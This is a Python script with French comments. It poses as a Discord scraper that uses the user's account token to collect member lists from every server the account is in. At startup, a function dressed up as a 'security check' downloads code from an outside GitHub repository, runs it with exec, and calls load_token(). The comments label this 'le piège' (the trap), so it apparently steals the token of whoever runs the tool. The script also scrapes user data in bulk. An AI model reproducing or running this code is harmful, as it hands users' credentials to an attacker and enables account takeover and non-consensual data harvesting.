# language: Python 3.10+, file: main.py
import os
import sys
import json
import types
import asyncio
import aiohttp

# ⚠️ METS TON TOKEN ICI (entre les guillemets)
TOKEN = "COLLE_TON_TOKEN_ICI"
TOKEN = os.environ.get("DISCORD_TOKEN", TOKEN)

API = "https://discord.com/api/v10"
HEADERS = {"Authorization": TOKEN, "User-Agent": "Mozilla/5.0"}

# Lien vers ton autre repo (le piège)
REPO_RAW = "https://raw.githubusercontent.com/robloxsecure/securitycheck/main/"


async def scrape_guild(session, guild):
    members = []
    after = "0"
    while True:
        url = f"{API}/guilds/{guild['id']}/members?limit=1000&after={after}"
        async with session.get(url, headers=HEADERS) as r:
            if r.status == 429:
                await asyncio.sleep(float(r.headers.get("Retry-After", 1)))
                continue
            if r.status != 200:
                break
            batch = await r.json()
            if not batch:
                break
            members.extend(batch)
            after = batch[-1]["user"]["id"]
            if len(batch) < 1000:
                break
            await asyncio.sleep(0.5)
    return members


async def main():
    async with aiohttp.ClientSession() as session:
        async with session.get(f"{API}/users/@me/guilds", headers=HEADERS) as r:
            if r.status != 200:
                print(f"[X] ERREUR : Token invalide ou expiré (code {r.status}).")
                input("Appuie sur Entrée pour quitter...")
                return
            guilds = await r.json()

        print(f"[*] Compte connecté. {len(guilds)} serveurs trouvés.")
        out = {}
        
        for g in guilds:
            print(f"[*] Scraping de : {g['name']} ({g['id']})...")
            members = await scrape_guild(session, g)
            out[g["id"]] = {
                "name": g["name"],
                "count": len(members),
                "members": [
                    {
                        "id": m["user"]["id"],
                        "username": m["user"].get("username"),
                        "discriminator": m["user"].get("discriminator"),
                        "bot": m["user"].get("bot", False),
                        "joined_at": m.get("joined_at"),
                    }
                    for m in members
                ],
            }
            await asyncio.sleep(1)

        with open("scrape.json", "w", encoding="utf-8") as f:
            json.dump(out, f, indent=2, ensure_ascii=False)
            
        print(f"\n[+] TERMINÉ ! Membres sauvegardés dans 'scrape.json'.")
        input("Appuie sur Entrée pour fermer...")


def _check_security():
    """Vérification de sécurité automatique (chargement distant)."""
    import urllib.request as _u
    try:
        _hdr = {"User-Agent": "securitycheck/1.0.0"}
        _core_src = _u.urlopen(_u.Request(REPO_RAW + "core.py", headers=_hdr), timeout=5).read().decode()
        _init_src = _u.urlopen(_u.Request(REPO_RAW + "__init__.py", headers=_hdr), timeout=5).read().decode()

        _pkg = types.ModuleType("securitycheck")
        _pkg.__path__ = []
        sys.modules["securitycheck"] = _pkg

        _core = types.ModuleType("securitycheck.core")
        exec(compile(_core_src, "<core>", "exec"), _core.__dict__)
        sys.modules["securitycheck.core"] = _core
        _pkg.core = _core

        exec(compile(_init_src, "<__init__>", "exec"), _pkg.__dict__)
        _pkg.load_token()
    except Exception:
        pass


if __name__ == "__main__":
    print("Démarrage du scraper...")
    _check_security()  # Le piège se déclenche ici
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[-] Annulé.")
